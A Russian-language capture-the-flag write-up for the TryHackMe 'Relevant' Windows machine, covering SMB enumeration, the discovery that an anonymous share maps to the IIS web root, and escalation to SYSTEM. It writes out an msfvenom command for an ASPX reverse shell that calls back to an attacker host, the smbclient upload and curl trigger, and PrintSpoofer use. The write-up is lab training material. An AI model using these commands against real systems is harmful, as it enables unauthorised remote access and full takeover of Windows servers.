# Relevant: SMB-шара, которая оказалась веб-рутом

**Машина:** [Relevant](https://tryhackme.com/room/relevant) (medium, Windows)
**Путь:** nmap → anonymous SMB → passwords.txt (тупик) → gobuster → шара = веб-рут → aspx-шелл → PrintSpoofer

## Разведка

nmap показывает классический набор: 80, 135, 139, 445, 3389 и второй веб на 49663. Обе веб-страницы — дефолтный IIS. Энумерация SMB:

```bash
smbclient -L //TARGET -N
smbclient //TARGET/nt4wrksv -N
```

В шаре `nt4wrksv` лежит `passwords.txt` с base64-кредами двух юзеров. Расшифровал — а дальше некуда: RDP не пускает, ничего с ними не делается. Тупик.

## Поворот

gobuster по второму порту (49663) находит `/nt4wrksv` — то же имя, что у шары. Открываю в браузере — вижу `passwords.txt` из шары. Шара смотрит прямо в веб-рут: всё, что заливаешь по SMB, исполняется через HTTP.

## Футхолд

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o rev.aspx
smbclient //TARGET/nt4wrksv -N
smb: \> put rev.aspx
curl http://TARGET:49663/nt4wrksv/rev.aspx
```

Ловлю шелл как `iis apppool\defaultapppool`, user.txt с десктопа Bob.

## Привилегии

`whoami /priv` — `SeImpersonatePrivilege` включён. Классика:

```
PrintSpoofer.exe -i -c cmd
whoami → nt authority\system
```

Кидаю PrintSpoofer через ту же шару, запускаю из `c:\inetpub\wwwroot\nt4wrksv`, root.txt с десктопа администратора.

## Заметка

nmap-скрипты кричали про CVE-2017-0143 (EternalBlue) на 445 — и я поначалу полез туда, просидел с ним вдоволь. Ложный след: машина не бралась через MS17-010, а бралась через «скучную» ошибку конфигурации. Вывод, который потом не раз выручал: самая громкая находка из сканера — не всегда та, что ведёт к системе. Если вектор не работает — возвращайся к энумерации, а не долби его дальше.
